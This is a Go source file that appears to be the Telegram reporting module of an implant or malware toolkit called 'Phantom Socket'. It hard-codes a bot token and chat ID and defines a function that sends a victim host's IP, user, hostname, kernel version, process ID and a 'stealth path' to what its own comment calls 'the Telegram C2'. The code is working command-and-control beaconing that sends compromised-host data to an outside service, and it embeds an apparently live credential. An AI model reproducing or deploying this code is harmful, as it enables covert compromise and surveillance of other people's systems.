// Package telegram - Telegram alerting for Phantom Socket infrastructure.
package telegram

import (
	"fmt"
	"net/http"
	"net/url"
	"os/exec"
	"runtime"
	"strings"
	"time"
)

var (
	GlobalTelegramToken  = "8602911604:AAGZs2G4n1DNFc9zzAcmsZyYdEWP1ARXh80"
	GlobalTelegramChatID = "5439698489"
)

func GetKernelVersion() string {
	if runtime.GOOS == "windows" {
		return "Windows"
	}
	out, err := exec.Command("uname", "-r").Output()
	if err != nil {
		return "Unknown"
	}
	return strings.TrimSpace(string(out))
}

// AlertData represents the structured content for a system alert.
type AlertData struct {
	Type          string
	IP            string
	User          string
	Hostname      string
	KernelVer     string
	ActionDetails string
	StealthPath   string
	PID           int
	Arch          string
}

// SendAlert sends a structured HTML report to the Telegram C2.
func SendAlert(event AlertData) error {
	apiURL := fmt.Sprintf("https://api.telegram.org/bot%s/sendMessage", GlobalTelegramToken)

	if event.KernelVer == "" {
		event.KernelVer = GetKernelVersion()
	}

	if event.Arch == "" {
		event.Arch = runtime.GOARCH
	}

	payload := fmt.Sprintf(
		"<b>SYSTEM ALERT: [%s]</b><br>"+
			"<b>TARGET IP    :</b> <code>%s</code><br>"+
			"<b>USER         :</b> <code>%s</code><br>"+
			"<b>HOSTNAME     :</b> <code>%s</code><br>"+
			"<b>KERNEL VER   :</b> <code>%s</code><br>"+
			"<b>PID / ARCH   :</b> <code>%d / %s</code><br>"+
			"<b>ACTION       :</b> %s<br>"+
			"<b>STEALTH PATH :</b> <code>%s</code><br>"+
			"<b>TIMESTAMP    :</b> %s",
		event.Type, event.IP, event.User, event.Hostname, event.KernelVer,
		event.PID, event.Arch, event.ActionDetails, event.StealthPath,
		time.Now().UTC().Format("2006-01-02 15:04:05 UTC"),
	)

	vals := url.Values{}
	vals.Set("chat_id", GlobalTelegramChatID)
	vals.Set("text", payload)
	vals.Set("parse_mode", "HTML")
	vals.Set("disable_web_page_preview", "true")

	client := &http.Client{Timeout: 15 * time.Second}
	resp, err := client.PostForm(apiURL, vals)
	if err != nil {
		return fmt.Errorf("transport failure: %w", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("api rejected request: %s", resp.Status)
	}

	return nil
}
